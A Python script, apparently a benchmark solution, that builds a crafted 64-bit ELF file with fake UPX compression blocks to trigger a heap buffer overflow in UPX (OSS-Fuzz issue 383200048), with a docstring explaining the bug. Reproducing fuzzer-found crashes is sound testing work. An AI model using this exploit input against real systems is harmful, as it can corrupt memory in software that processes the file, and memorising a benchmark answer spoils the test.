import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability oss-fuzz:383200048 in UPX.

        The vulnerability is a heap buffer overflow due to ph.method not being
        reset between processing compressed blocks in a shared library.

        PoC Strategy:
        1. Create a minimal 64-bit ELF file of type ET_DYN (shared object).
        2. Embed a fake UPX compression block with two sub-blocks.
        3. Block 1:
           - Use a special method (255) to trigger the shared library code path.
           - This path reads extra metadata from the compressed stream, including
             a `ph.method` value. We set this to a non-zero value (e.g., 1).
           - It also reads `ph.p_filesz`. We set this to a value `S_c`.
           - Set the uncompressed size of this block to 0, so no actual
             decompression occurs for it.
        4. Block 2:
           - Use a standard decompression method (e.g., M_STORE = 1).
           - Due to the bug, the non-zero `ph.method` from block 1 is carried over.
           - This triggers an `else if (ph.method)` branch, which is intended for
             a different compression scheme.
           - This branch reduces the block's declared uncompressed size (`S_unc`)
             by `S_c` (`S_unc' = S_unc - S_c`).
           - It then calls the standard decompressor for the block, but with the
             *reduced* size `S_unc'` as the output buffer limit.
           - We craft the compressed data for block 2 to decompress to a size
             greater than `S_unc'`, causing a heap buffer overflow.
           - Using M_STORE, the "decompressed" size is simply the compressed size.
             So we set compressed size `S_cpr > S_unc'`.
        """
        
        # Helper for little-endian packing
        def u8(n: int) -> bytes: return struct.pack('<B', n)
        def u16(n: int) -> bytes: return struct.pack('<H', n)
        def u32(n: int) -> bytes: return struct.pack('<I', n)
        def u64(n: int) -> bytes: return struct.pack('<Q', n)

        # -------- ELF Header (64-bit) --------
        ehdr = b''
        ehdr += b'\x7fELF\x02\x01\x01' + b'\x00' * 9  # e_ident
        ehdr += u16(3)                               # e_type = ET_DYN
        ehdr += u16(62)                              # e_machine = EM_X86_64
        ehdr += u32(1)                               # e_version
        ehdr += u64(0)                               # e_entry
        ehdr += u64(64)                              # e_phoff (program header offset)
        ehdr += u64(0)                               # e_shoff (no sections)
        ehdr += u32(0)                               # e_flags
        ehdr += u16(64)                              # e_ehsize
        ehdr += u16(56)                              # e_phentsize
        ehdr += u16(2)                               # e_phnum
        ehdr += u16(0)                               # e_shentsize
        ehdr += u16(0)                               # e_shnum
        ehdr += u16(0)                               # e_shstrndx

        # -------- Program Headers --------
        # PHT starts at offset 64, has 2 entries, each 56 bytes. Ends at 176.
        upx_data_offset = 176
        
        # PHDR 1: For UPX data
        phdr1_part1 = b''
        phdr1_part1 += u32(1)                        # p_type = PT_LOAD
        phdr1_part1 += u32(4)                        # p_flags = R
        phdr1_part1 += u64(upx_data_offset)          # p_offset
        phdr1_part1 += u64(0x400000)                 # p_vaddr
        phdr1_part1 += u64(0x400000)                 # p_paddr
        # p_filesz, p_memsz, p_align will be set later
        
        # PHDR 2: Dummy loadable segment
        phdr2 = b''
        phdr2 += u32(1)                              # p_type = PT_LOAD
        phdr2 += u32(6)                              # p_flags = RW
        phdr2 += u64(0)                              # p_offset
        phdr2 += u64(0x600000)                       # p_vaddr
        phdr2 += u64(0x600000)                       # p_paddr
        phdr2 += u64(0)                              # p_filesz
        phdr2 += u64(0x1000)                         # p_memsz
        phdr2 += u64(0x1000)                         # p_align

        # -------- Vulnerability-specific values --------
        b1_sz_unc_val = 0
        b1_sz_cpr_val = 32
        b1_method_val = 255

        ph_p_filesz_val = 0x10                       # S_c
        b2_sz_unc_val = 0x20                         # S_unc
        # S_unc' = S_unc - S_c = 0x20 - 0x10 = 0x10
        # We need S_cpr > S_unc'
        b2_sz_cpr_val = 0x11                         # S_cpr
        b2_method_val = 1                            # M_STORE

        # -------- UPX Metadata and Data Blocks --------
        # Data for block 1: sets ph.* values
        data1 = b''
        data1 += u32(b2_method_val)                  # new b_method (unused)
        data1 += u32(1)                              # ph.method = 1 (non-zero)
        data1 += u32(0)                              # ph.p_offset
        data1 += u32(ph_p_filesz_val)                # ph.p_filesz
        data1 += u32(0)                              # ph.p_vaddr
        data1 += u32(0)                              # ph.p_memsz
        data1 = data1.ljust(b1_sz_cpr_val, b'\0')

        # Data for block 2: content to be copied, causing overflow
        data2 = b'A' * b2_sz_cpr_val

        # l_info structure (16 bytes)
        l_info = b''
        l_info += b'UPX\x01'                         # l_magic
        l_info += u8(0)                              # l_version
        l_info += u8(0x0b)                           # l_format = ELF
        l_info += u8(1)                              # l_method (default)
        l_info += u8(0)                              # l_level
        l_info += u32(16)                            # l_lsize
        l_info += u32(28)                            # l_psize
        
        # p_info structure (28 bytes)
        total_unc = b1_sz_unc_val + b2_sz_unc_val
        total_cpr = b1_sz_cpr_val + b2_sz_cpr_val
        p_info = b''
        p_info += u32(total_unc)                     # sz_unc
        p_info += u32(total_cpr)                     # sz_cpr
        p_info += u32(16)                            # sz_lsize
        p_info += u32(28)                            # sz_psize
        p_info += u32(0)                             # filter
        p_info += u32(0)                             # filter_cto
        p_info += u32(2)                             # n_block

        # Calculate data offsets relative to the file start
        b_info_array_offset = upx_data_offset + len(l_info) + len(p_info)
        data1_offset = b_info_array_offset + 2 * 16
        data2_offset = data1_offset + b1_sz_cpr_val

        # b_info for block 1 (16 bytes)
        b_info1 = u32(b1_sz_unc_val) + u32(b1_sz_cpr_val) + u32(b1_method_val) + u32(data1_offset)
        
        # b_info for block 2 (16 bytes)
        b_info2 = u32(b2_sz_unc_val) + u32(b2_sz_cpr_val) + u32(b2_method_val) + u32(data2_offset)
        
        # Assemble UPX data content
        upx_content = l_info + p_info + b_info1 + b_info2 + data1 + data2

        # Finalize PHDR 1 with correct size
        phdr1_part2 = b''
        phdr1_part2 += u64(len(upx_content))         # p_filesz
        phdr1_part2 += u64(len(upx_content))         # p_memsz
        phdr1_part2 += u64(0x1000)                   # p_align
        phdr1 = phdr1_part1 + phdr1_part2
        
        # Assemble final PoC
        poc = ehdr + phdr1 + phdr2 + upx_content
        return poc